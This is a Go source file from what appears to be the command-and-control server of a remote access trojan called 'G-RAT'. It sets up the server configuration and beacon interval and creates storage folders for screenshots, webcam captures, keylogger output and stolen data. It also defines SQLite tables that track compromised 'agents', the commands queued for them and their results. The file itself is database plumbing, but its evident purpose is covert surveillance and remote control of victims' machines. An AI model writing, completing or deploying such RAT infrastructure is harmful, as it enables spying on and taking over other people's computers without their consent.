package core

import (
	"crypto/rand"
	"database/sql"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log" // Keep this import
	"os"
	"path/filepath"
	"time"

	_ "github.com/mattn/go-sqlite3"
	"github.com/sevil11/g-rat/shared"
)

var (
	db *sql.DB
	config map[string]string
)

// InitConfig loads or creates server configuration
func InitConfig() error {
	config = make(map[string]string)
	
	// Default configuration
	config["server_name"] = "G-RAT C2"
	config["beacon_interval"] = "60" // seconds
	config["max_agents"] = "100"
	config["data_dir"] = "./data"
	
	// Ensure data directory exists
	if err := os.MkdirAll(config["data_dir"], 0755); err != nil {
		return fmt.Errorf("failed to create data directory: %v", err)
	}
	
	// Create directories for plugins
	for _, dir := range []string{"screenshots", "webcam", "keylogger", "data"} {
		path := filepath.Join(config["data_dir"], dir)
		if err := os.MkdirAll(path, 0755); err != nil {
			log.Printf("Creating directory: %s", path) // Added log statement
			return fmt.Errorf("failed to create directory %s: %v", path, err)
		}
	}
	
	fmt.Println("[+] Server configuration initialized")
	return nil
}

// Rest of the code remains unchanged

// InitDatabase initializes the SQLite database
func InitDatabase(dbFile string) error {
	var err error
	db, err = sql.Open("sqlite3", dbFile)
	if err != nil {
		return fmt.Errorf("failed to open database: %v", err)
	}
	
	// Create tables if they don't exist
	_, err = db.Exec(`
		CREATE TABLE IF NOT EXISTS agents (
			id TEXT PRIMARY KEY,
			first_seen TIMESTAMP,
			last_seen TIMESTAMP,
			system_info TEXT,
			ip TEXT,
			online BOOLEAN,
			version TEXT
		);
		
		CREATE TABLE IF NOT EXISTS tasks (
			id TEXT PRIMARY KEY,
			agent_id TEXT,
			type TEXT,
			command TEXT,
			args TEXT,
			create_time TIMESTAMP,
			status TEXT
		);
		
		CREATE TABLE IF NOT EXISTS results (
			id TEXT PRIMARY KEY,
			task_id TEXT,
			agent_id TEXT,
			output TEXT,
			error TEXT,
			exit_code INTEGER,
			start_time TIMESTAMP,
			finish_time TIMESTAMP,
			FOREIGN KEY (task_id) REFERENCES tasks(id)
		);
	`)
	
	if err != nil {
		return fmt.Errorf("failed to create tables: %v", err)
	}
	
	fmt.Println("[+] Database initialized")
	return nil
}

// SaveAgent persists agent information to the database
func SaveAgent(agent *shared.Agent) error {
	systemInfoJSON, err := json.Marshal(agent.SystemInfo)
	if err != nil {
		return fmt.Errorf("failed to marshal system info: %v", err)
	}
	
	_, err = db.Exec(
		"INSERT OR REPLACE INTO agents (id, first_seen, last_seen, system_info, ip, online, version) VALUES (?, ?, ?, ?, ?, ?, ?)",
		agent.ID, agent.FirstSeen, agent.LastSeen, string(systemInfoJSON), agent.IP, agent.Online, agent.Version,
	)
	return err
}

// SaveResult persists task result to the database
func SaveResult(result *shared.Result) error {
	resultID := GenerateUID()
	_, err := db.Exec(
		"INSERT INTO results (id, task_id, agent_id, output, error, exit_code, start_time, finish_time) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
		resultID, result.TaskID, result.AgentID, result.Output, result.Error, result.ExitCode, result.StartTime, result.FinishTime,
	)
	return err
}

// GenerateUID creates a unique identifier
func GenerateUID() string {
	bytes := make([]byte, 16)
	_, err := rand.Read(bytes)
	if err != nil {
		// Fall back to time-based ID if crypto/rand fails
		return fmt.Sprintf("%x", time.Now().UnixNano())
	}
	return hex.EncodeToString(bytes)
}
